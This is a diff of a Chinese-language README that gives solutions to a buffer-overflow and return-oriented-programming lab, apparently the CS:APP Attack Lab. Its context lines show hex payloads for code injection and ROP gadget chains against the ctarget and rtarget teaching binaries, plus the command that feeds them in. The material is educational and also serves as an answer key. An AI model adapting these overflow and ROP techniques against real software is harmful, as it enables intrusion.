@@ -10,7 +10,7 @@
 
 ## 如何运行
 
-```sh
+``` sh
 # 在 target1_my 目录下
 ./hex2raw < ans/ans{1..3}.txt | ./ctarget -q
 ./hex2raw < ans/ans{4,5}.txt | ./rtarget -q
@@ -31,7 +31,7 @@
 
 利用缓冲区溢出使得 `test()` 中 `getbuf()` 返回时调用 `touch1()`
 
-```cpp
+``` cpp
 void test()
 {
     int val;
@@ -54,7 +54,7 @@ void touch1()
 
 #### 答案
 
-```assembly
+```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -69,7 +69,7 @@ c0 17 40 00 00 00 00 00 /* touch1() */
 
 类似地，只不过调用 `touch2()` 的同时需传入参数（即改变 `%rdi` 寄存器的值）
 
-```cpp
+``` cpp
 void touch2(unsigned val)
 {
     vlevel = 2;
@@ -90,7 +90,7 @@ void touch2(unsigned val)
 
 #### 答案
 
-```assembly
+```
 48 c7 c7 fa 97 b9 59 68 /* mov  $0x59b997fa, %rdi;   pushq  $0x4017ec;   ret */
 ec 17 40 00 c3 00 00 00 /* 0x004017ec is the address of touch2()             */
 00 00 00 00 00 00 00 00
@@ -105,7 +105,7 @@ ec 17 40 00 c3 00 00 00 /* 0x004017ec is the address of touch2()             */
 
 这一回调用 `touch3()` 时需要传入的参数是指针，字符串内容为 `cookie`
 
-```cpp
+``` cpp
 int hexmatch(unsigned val, char *sval)
 {
     char cbuf[110];
@@ -134,7 +134,7 @@ void touch3(char *sval)
 
 #### 答案
 
-```assembly
+```
 48 c7 c7 a8 dc 61 55 68 /* mov  $0x5561dca8, %rdi;   pushq  $0x4018fa;   ret */
 fa 18 40 00 c3 00 00 00 /* 0x5561dca8 is the address of cookie(Line 7)       */
 00 00 00 00 00 00 00 00 /* 0x004018fa is the address of touch3()             */
@@ -155,7 +155,7 @@ fa 18 40 00 c3 00 00 00 /* 0x5561dca8 is the address of cookie(Line 7)       */
 
 先简单介绍一下ROP攻击的原理，比如我们汇编代码中有这样一个函数：
 
-```assembly
+``` assembly
 00000000004019c3 <setval_426>:
   4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
   4019c9:	c3                   	retq   
@@ -169,7 +169,7 @@ fa 18 40 00 c3 00 00 00 /* 0x5561dca8 is the address of cookie(Line 7)       */
 
 `phase_4~5` 都要求在指定的 `farm` 范围内寻找 `gadget`，本题 `farm` 如下：
 
-```assembly
+``` assembly
 000000000040199a <getval_142>:
   40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
   40199f:	c3                   	retq   
@@ -207,7 +207,7 @@ fa 18 40 00 c3 00 00 00 /* 0x5561dca8 is the address of cookie(Line 7)       */
 
 #### 答案
 
-```assembly
+```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -229,7 +229,7 @@ ec 17 40 00 00 00 00 00 /* touch2()          */
 
 本题与 `phase_4` 相比，增加了以下 `farm` ：
 
-```assembly
+``` assembly
 00000000004019d6 <add_xy>:
   4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   4019da:	c3                   	retq   
@@ -369,7 +369,7 @@ ec 17 40 00 00 00 00 00 /* touch2()          */
 
 #### 答案
 
-```assembly
+```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
